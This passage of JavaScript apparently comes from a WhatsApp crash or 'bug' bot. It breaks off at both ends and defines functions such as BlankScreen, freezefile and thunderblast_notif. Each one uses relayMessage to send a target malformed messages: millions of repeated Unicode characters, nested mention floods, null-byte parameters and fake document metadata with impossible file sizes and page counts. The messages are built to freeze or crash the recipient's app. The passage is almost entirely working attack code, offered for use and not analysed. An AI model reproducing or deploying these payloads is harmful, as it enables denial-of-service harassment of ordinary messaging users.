᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴᬴".repeat(50),
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
                        },
                            mentionedJid: Array.from({ length: 9 }, () => "1@newsletter"),
                            contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "9@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
                        },
                            groupMentions: [
                                {
                                    groupJid: "1@newsletter", 
                                    groupSubject: "UNDEFINED",  
                                    groupMetadata: {
                                        creationTimestamp: 1715880173,  
                                        ownerJid: "owner@newsletter",  
                                        adminJids: ["admin@newsletter", "developer@newsletter"], 
                                    }
                                }
                            ],
                            externalContextInfo: {
                                customTag: "SECURE_PAYBUG_MESSAGE",  
                                securityLevel: "HIGH",  
                                referenceCode: "PAYBUG10291",  
                                timestamp: new Date().toISOString(),  
                                messageId: "MSG00123456789",  
                                userId: "UNDEFINED"  
                            },
                            mentionedJid: Array.from({ length: 9 }, () => "9@newsletter"),
                            groupMentions: [{ groupJid: "9@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 8 }, () => "8@newsletter"),
                            groupMentions: [{ groupJid: "8@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 7 }, () => "7@newsletter"),
                            groupMentions: [{ groupJid: "7@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 6 }, () => "6@newsletter"),
                            groupMentions: [{ groupJid: "6@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 4 }, () => "4@newsletter"),
                            groupMentions: [{ groupJid: "4@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 3 }, () => "3@newsletter"),
                            groupMentions: [{ groupJid: "3@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 2 }, () => "2@newsletter"),
                            groupMentions: [{ groupJid: "2@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 1 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
                        },
                        contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }]
                        },
                    contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "UNDEFINED" }],
                        isForwarded: true,
                        quotedMessage: {
								documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "999999999999",
											pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "Alwaysaqioo The Juftt️",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "",
						}
                    }
                    }
                }
            }
        }
    };

    cella.relayMessage(target, messagePayload, { participant: { jid: target } }, { messageId: null });
}
 async function BlankScreen(target, Ptcp = false) {
let virtex = "  ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ " + "ྫྷ".repeat(1990000) + "@0".repeat(1990000);
			await cella.relayMessage(target, {
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 1316134911,
										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
										fileName: "Hayolo",
										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegThumbnail: "https://i.ibb.co/VWZy3qxT/shaban-md.jpg",
									},
									hasMediaAttachment: true,
								},
								body: {
									text: virtex,
								},
								nativeFlowMessage: {
								name: "call_permission_request",
								messageParamsJson: "\u0000".repeat(5000),
								},
								contextInfo: {
								mentionedJid: ["0@s.whatsapp.net"],
									forwardingScore: 1,
									isForwarded: true,
									fromMe: false,
									participant: "0@s.whatsapp.net",
									remoteJid: "status@broadcast",
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 1316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "Bokep 18+",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "https://files.catbox.moe/9otuif.jpg",
										},
									},
								},
							},
						},
					},
				},
				Ptcp ? {
					participant: {
						jid: target
					}
				} : {}
			);
            console.log(chalk.red.bold('҉𝕱𝖆𝖒𝖟𝖞𝖃𝖙𝖗𝖊𝖒𝖊🖤'))
   	};
async function freezefile(target, QBug, Ptcp = true) {
    let virtex = "  ꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾꦾ " + "ြ".repeat(120000);
    await cella.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                            mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999",
                            pageCount: 0x9184e729fff,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: "NtahMengapa..",
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                            mediaKeyTimestamp: "1715880173",
                            contactVcard: true
                        },
                        title: "",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: virtex
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "ancella" }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}
async function thunderblast_notif(target) {
			await cella.relayMessage(target, {
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 1316134911,
										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
										fileName: "\u0000",
										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegThumbnail: 'https://i.top4top.io/p_32261nror0.jpg',
									},
									hasMediaAttachment: true,
								},
								body: {
